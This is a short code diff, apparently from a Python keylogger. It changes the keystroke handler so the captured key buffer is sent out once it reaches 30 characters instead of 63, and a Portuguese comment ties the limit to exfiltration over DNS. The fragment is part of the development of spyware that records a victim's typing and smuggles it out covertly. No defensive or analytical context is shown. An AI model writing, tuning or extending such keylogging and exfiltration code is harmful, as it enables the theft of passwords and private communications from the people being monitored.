@@ -73,7 +73,7 @@ def on_key_event(e):
     global _KEYS, _LAST_KEY
     
     # Só envio quando bater o tamanho máximo de envio por DNS
-    if len(_KEYS) >= 63:
+    if len(_KEYS) >= 30:
         send_data(_KEYS)
         _KEYS = ''
     
